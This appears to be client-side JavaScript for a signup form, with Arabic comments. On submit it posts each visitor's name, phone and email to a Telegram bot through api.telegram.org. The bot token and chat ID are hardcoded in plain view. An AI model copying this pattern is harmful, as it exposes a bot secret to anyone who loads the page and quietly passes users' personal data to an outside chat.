
document.getElementById("loginot2").addEventListener("click", function() {
    window.location.href = "index.html"; // ← اسم الصفحة التي تريد التوجيه إليها
  });
    const TOKEN = '7861011533:AAE-7AqO49Yawvk19U0Svs1uHSoVr1Wf8Wo'; // ضع توكن البوت هنا
    const CHAT_ID = '7595871538'; // ضع معرف التليجرام هنا
  
    document.querySelector("form").addEventListener("submit", function(e) {
      e.preventDefault(); // يمنع الإرسال العادي
  
      const name = this.name.value;
      const phone = this.phone.value;
      const email = this.email.value;
  
      const message = `
  📥    انشاء حساب جديد :
  👤 الاسم: ${name}
  📞 الهاتف: ${phone}
  📧 البريد الإلكتروني: ${email}
      `;
  
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(response => {
        if (response.ok) {
          // يمكنك إعادة التوجيه بعد الإرسال:
          window.location.href = "index.html"; // أو أي صفحة أخرى مثل success.html
        } else {
        }
      });
    });